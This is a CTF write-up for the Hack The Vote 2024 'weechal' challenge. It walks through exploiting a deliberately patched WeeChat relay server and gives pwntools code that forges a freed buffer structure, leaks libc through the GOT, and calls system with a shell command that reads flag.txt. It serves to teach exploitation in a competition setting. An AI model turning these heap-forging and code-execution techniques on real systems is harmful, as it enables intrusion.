---
title: "Hack The Vote 2024: weechal"
date: 2024-11-10T10:40:00-05:00
type: posts
tags: ["Binary Exploitation", "CTF"]
---

Weechal was a binary exploitation challenge in Hack The Vote 2024, an election-themed computer security Capture the Flag (CTF) competition run by RPISEC.

I competed under the team name "worst" along with my friend Krishna and managed to solve this challenge on day two of the event. We were the second of five teams to solve it, missing first blood by a few hours.

## Challenge

The challenge was a modified build of version 3.4 of the [WeeChat IRC client](https://weechat.org/) that was running as a relay server using WeeChat's own protocol, which is described by the user manual as being *"used by remote interfaces to display and interact with WeeChat."* The [exact commands](https://github.com/RPISEC/HackTheVote/blob/master/2024/pwn/weechal/src/challenge) used to launch the challenge have us communicating with the relay through a Unix domain socket and set "ctf" as the password needed to connect.

In WeeChat, a *window* is an area of the screen that displays a *buffer*, which in turn is an object that contains text and to which text and commands can be sent by the user. For example, there is a buffer for each channel the user is chatting in as well as a main "core" buffer that always exists.

As documented in the [WeeChat Relay protocol specification](https://weechat.org/files/doc/devel/weechat_relay_protocol.en.html), the protocol involves passing raw pointers between the client and server. For example, if the client politely asks the server for a list of buffers by sending "`infolist buffer`", the server will happily reply with, among other information, the addresses of the [`t_gui_buffer`](https://github.com/weechat/weechat/blob/3.4/src/gui/gui-buffer.h#L73-L224) structures representing each buffer.

These addresses can also be used as arguments to other commands, such as `input 0x1234abcd hello`, which would attempt to send "hello" to the buffer at memory address `0x1234abcd`. Ordinarily the server makes sure that the pointers it's given are valid, but the challenge has been compiled with [this patch](https://github.com/RPISEC/HackTheVote/blob/master/2024/pwn/weechal/src/chal.patch) to remove some of these checks, allowing us to trick it into using any memory we like as if it were a `t_gui_buffer`. This capability can be used to gain arbitrary code execution and read the `flag.txt` file.


## Exploit

My approach was to create a buffer, learn its address with `infolist buffer`, and close it, freeing its memory. I filled the hole where the buffer used to be with the `/eval` command, using `${base_decode:16,...}` to send a hex-encoded string to avoid issues with null-termination.

It turns out that there is a [static buffer](https://github.com/weechat/weechat/blob/3.4/src/plugins/relay/relay-client.c#L580) in `relay.so` holding the raw bytes sent by the client before any parsing takes place. Using this would have eliminated the need to leak any heap addresses at all, but unfortunately I was not aware of it. Taking advantage of its existence is left as an exercise for the reader.

Let's walk through the exploit step by step, using the excellent [pwntools](https://github.com/Gallopsled/pwntools) library to make life easier. We start by connecting to and performing a handshake with the relay server, disabling compression for simplicity. Then the previously mentioned buffer is allocated, its address is leaked, and finally it is freed.

```python
from pwn import *

context.binary = "weechat/bin/weechat-headless"
libc = ELF("libc.so.6")
relay = ELF("weechat/lib/weechat/plugins/relay.so")

io = remote("weechal.chal.hackthe.vote", 1337)
io.sendline(b"handshake compression=off")
io.sendline(b"init password=ctf")

io.sendline(b"input core.weechat /buffer add asdf")
io.sendline(b"infolist buffer")
io.sendline(b"input core.weechat /buffer close asdf")
```

The messages the server sends back are in a binary format, but we can get the information we need without properly parsing it. See the protocol specification if you're interested in the details.

The first pointer received points to the `t_gui_buffer` for the main `core.weechat` buffer, though we won't actually be using it. Next up is a buffer created by the relay plugin, which will be useful later. Finally, we receive the address of the hole we've created.

```python
def read_pointer():
    io.recvuntil(b"pointer")
    io.recvuntil(b"ptr")
    return int(io.recvn(u8(io.recvn(1))), 16)


core_weechat = read_pointer()
relay_buffer = read_pointer()
hole = read_pointer()
log.info(f"{relay_buffer=:#x}")
log.info(f"{hole=:#x}")
```

We can now fill in the hole. The `eval ${base_decode:16...}` command will decode a hex-encoded string into a fresh heap allocation. By sending a string of the correct length, we can get this to be the same area of memory that our recently freed `t_gui_buffer` occupied and forge our own in its place.

```python
def fill_hole(*args):
    data = flat(*args, length=0x248 // 2 - 1, filler=p8(0))
    io.sendline(
        b"input core.weechat /eval ${base_decode:16," + data.hex().encode() + b"}"
    )
```

Being able to hex-encode the payload is nice because it sidesteps any issues with null termination, but the implementation of `base_decode` conservatively creates an allocation with the same size as the hex string we give it. We need to send a string of length `sizeof(t_gui_buffer) = 0x248` to fill the hole, but after being decoded our payload will only fill half of that. Luckily, this turns out not to be a problem as we don't need to control anything beyond the first half of `t_gui_buffer`.

After the `eval` command completes, the allocation will be freed again, though most of the data will remain intact. This actually works in our favor, allowing repeated uses of `eval` to reuse the same memory as many times as needed without extra effort.

As for what to send, let's examine the `t_gui_buffer` structure. Here are the relevant fields and their corresponding offsets as shown by the `ptype` command in `gdb`:

```
(gdb) ptype/ox struct t_gui_buffer
/* offset  |    size */  type = struct t_gui_buffer {
                           ...
/* 0x0028  |  0x0008 */    char *full_name;
                           ...
/* 0x00b8  |  0x0008 */    struct t_gui_nick_group *nicklist_root;
                           ...
/* 0x0100  |  0x0008 */    int (*input_callback)(const void *, void *, struct t_gui_buffer *, const char *);
/* 0x0108  |  0x0008 */    const void *input_callback_pointer;
                           ...
                               /* total size (bytes):  584 */
                         }
```

The plan is to point `input_callback` to the `system` function in the C standard library, point `input_callback_pointer` to the command to run, and then send an `input` command to our fake buffer to trigger a call to `input_callback`. Before that happens, `full_name` will be passed to `strdup`, so we also need to make sure it points to a valid address.

To locate `system` we need a way of reading from an arbitrary address. This can be accomplished with the `nicklist` command, which walks through a linked list of `t_gui_nick_group` structures starting at `nicklist_root`.

```
(gdb) ptype struct t_gui_nick_group
type = struct t_gui_nick_group {
    char *name;
    char *color;
    int visible;
    int level;
    struct t_gui_nick_group *parent;
    struct t_gui_nick_group *children;
    struct t_gui_nick_group *last_child;
    struct t_gui_nick *nicks;
    struct t_gui_nick *last_nick;
    struct t_gui_nick_group *prev_group;
    struct t_gui_nick_group *next_group;
}
```

We can craft a list with a single entry that has its `name` set to wherever we're interested in reading from. The data starting at that address and continuing until the first null byte will be found at offset `0x9e` in the response to `nicklist`.

```python
def leak(addr):
    fill_hole(
        {
            0x28: hole,  # full_name
            0xB8: hole + 0xC0,  # nicklist_root
            0xC0: [addr, hole, 1, 0, 0, 0, 0, 0, 0, 0, 0],
        }
    ),
    io.clean()
    io.sendline(f"nicklist {hole:#x}".encode())
    io.recvn(0x9E)
    return u64(io.recvn(8))
```

`system` can be found by starting at `relay_buffer->input_callback`, which holds the address of the `relay_buffer_input_cb` function in `relay.so`, then reading the address of a function in `libc.so` from `relay.so`'s global offset table.

```
relay.address = leak(relay_buffer + 0x100) - relay.symbols["relay_buffer_input_cb"]
libc.address = leak(relay.symbols["got.ctime"]) - libc.symbols["ctime"]
log.info(f"{relay.address=:#x}")
log.info(f"{libc.address=:#x}")
```

Now we can simply run `cat flag.txt` to read the flag, but since we're not connected to the server's standard output we won't receive anything back. The socket we are connected to will be inherited by the shell `system` spawns, though, and it's easy enough to redirect the output of `cat` to it. The command in the following code loops over all open file descriptors, trying each one. It's not very elegant, but this is CTF!

```python
fill_hole(
    {
        0x28: hole,  # full_name
        0x30: b"for fd in $(ls /proc/$$/fd); do cat flag.txt >&$fd; done",
        0x100: libc.symbols["system"],  # input_callback
        0x108: hole + 0x30,  # input_callback_pointer
    }
)
io.sendline(f"input {hole:#x} asdf".encode())
log.success(io.recvregex(b"(flag\{.*\})", capture=True)[1].decode())
```

The full exploit can be found [here](solve.py). Running it yields the flag: 

`flag{i_cant_believe_i_had_to_patch_out_checks_in_an_api_that_takes_pointers_over_the_wire}`
